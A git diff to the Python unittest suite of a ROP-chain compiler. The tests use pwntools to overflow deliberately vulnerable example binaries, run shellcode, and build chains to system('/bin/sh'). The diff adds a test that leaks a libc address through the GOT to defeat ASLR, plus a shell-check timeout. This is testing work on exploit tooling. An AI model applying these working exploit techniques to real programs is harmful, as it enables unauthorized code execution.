@@ -1,9 +1,20 @@
-import sys, logging, unittest, binascii
+import sys, logging, unittest, binascii, os, signal
 import archinfo
 from pwn import *
 import rop_compiler.ropme as ropme
 
+def e(filename):
+  return '../example/' + filename
+
 class BofTests(unittest.TestCase):
+
+  def setUp(self):
+    if 'LD_PRELOAD' in os.environ:
+      del os.environ['LD_PRELOAD']
+
+  def tearDown(self):
+    if 'LD_PRELOAD' in os.environ:
+      del os.environ['LD_PRELOAD']
 
   def random_string(self, n = 10):
     return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(n))
@@ -38,15 +49,25 @@ class BofTests(unittest.TestCase):
      +  "\xcd\x80"              # int    0x80
     )
 
+  def signal_handler(self, signum, frame):
+      raise Exception("Timed out!")
+
   def check_shell(self, p):
     input_str = self.random_string()
     p.writeline('echo ' + input_str)
-    output_str = p.readline().strip()
-    self.assertEqual(input_str, output_str)
+
+    signal.signal(signal.SIGALRM, self.signal_handler)
+    signal.alarm(10) # ten seconds
+    try:
+      output_str = ""
+      while output_str != input_str:
+        output_str = p.readline().strip()
+    except Exception, msg:
+      self.assertFail()
     p.close()
 
   def test_bof(self):
-    filename = '../example/bof'
+    filename = e('bof')
     p = process([filename,'3000'])
 
     line = p.readline()
@@ -61,7 +82,7 @@ class BofTests(unittest.TestCase):
     self.check_shell(p)
 
   def test_bof_execve(self):
-    filename = '../example/bof_execve'
+    filename = e('bof_execve')
     bof_execve = process([filename,'3000']) # start the program
     p = remote('localhost', 2222)
 
@@ -91,9 +112,9 @@ class BofTests(unittest.TestCase):
 
   def bof_many_args(self, is_64bit):
     if is_64bit:
-      filename, arch = '../example/bof_many_args', archinfo.ArchAMD64()
+      filename, arch = e('bof_many_args'), archinfo.ArchAMD64()
     else:
-      filename, arch = '../example/bof_many_args_x86', archinfo.ArchX86()
+      filename, arch = e('bof_many_args_x86'), archinfo.ArchX86()
 
     files = [(filename, None, 0)]
     rop = ropme.rop(files, [], [["function", "callme", 11,12,13,14,15,16,17,18]], arch = arch, log_level = logging.DEBUG)
@@ -107,7 +128,7 @@ class BofTests(unittest.TestCase):
     p.close()
 
   def test_bof_shell(self):
-    filename = '../example/bof_shell'
+    filename = e('bof_shell')
 
     files = [(filename, None, 0)]
     rop = ropme.rop(files, [], [["shellcode_hex", binascii.hexlify(self.shellcode_amd64())]], log_level = logging.DEBUG)
@@ -119,7 +140,7 @@ class BofTests(unittest.TestCase):
     self.check_shell(p)
 
   def test_bof_system(self):
-    filename = '../example/bof_system2'
+    filename = e('bof_system2')
     files = [(filename, None, 0)]
     rop = ropme.rop(files, [], [["function", "system", "uname -a\x00"], ["function", "exit", 33]], log_level = logging.DEBUG)
     payload = 'A'*512 + 'B'*8 + rop
@@ -136,7 +157,7 @@ class BofTests(unittest.TestCase):
     self.assertEqual(expected, actual)
 
   def test_bof_syscall(self):
-    filename = '../example/bof_syscall'
+    filename = e('bof_syscall')
     p = process([filename,'3000'])
 
     buffer_address = int(p.readline().split(":")[1],16)
@@ -150,10 +171,10 @@ class BofTests(unittest.TestCase):
     self.check_shell(p)
 
   def test_bof_read_got(self):
-    self.do_test_bof_read_got('../example/bof_read_got')
+    self.do_test_bof_read_got(e('bof_read_got'))
 
   def test_bof_read_got2(self):
-    self.do_test_bof_read_got('../example/bof_read_got2')
+    self.do_test_bof_read_got(e('bof_read_got2'))
 
   def do_test_bof_read_got(self, filename):
     p = process([filename,'3000'])
@@ -167,7 +188,7 @@ class BofTests(unittest.TestCase):
     self.check_shell(p)
 
   def test_bof_read_got_x86(self):
-    filename = '../example/bof_read_got_x86'
+    filename = e('bof_read_got_x86')
     p = process([filename,'3000'])
 
     files = [(filename, None, 0)]
@@ -176,6 +197,28 @@ class BofTests(unittest.TestCase):
     payload = 'A'*512 + ('B'*16) + rop
     p.writeline(payload)
     p.readline()
+    self.check_shell(p)
+
+  def test_leak_overflowx86(self):
+    filename = e('leak_overflow')
+    libc, libc_gadgets = e('libc.so'), e('libc.gadgets')
+
+    os.environ['LD_PRELOAD'] = libc # Ensure we use the libc that we've pulled gadgets from
+    p = process([filename])
+
+    p.writeline("1")
+    p.readuntil("what address would you like to peek at?\n")
+    p.writeline("0x804a010") # leak address of fgets
+    fgets_addr = int(p.readline().split(":")[1].strip(), 16)
+    libc_address = fgets_addr - ELF(libc).symbols['fgets']
+
+    goals = [ ["function", "system", "/bin/sh"] ]
+    files = [(filename, None, 0), (libc, libc_gadgets, libc_address)]
+    rop = ropme.rop(files, [libc], goals, arch = archinfo.ArchX86(), log_level = logging.DEBUG)
+
+    p.writeline("2")
+    p.writeline('A'*272 + rop)
+    p.writeline("3")
     self.check_shell(p)
 
 if __name__ == '__main__':
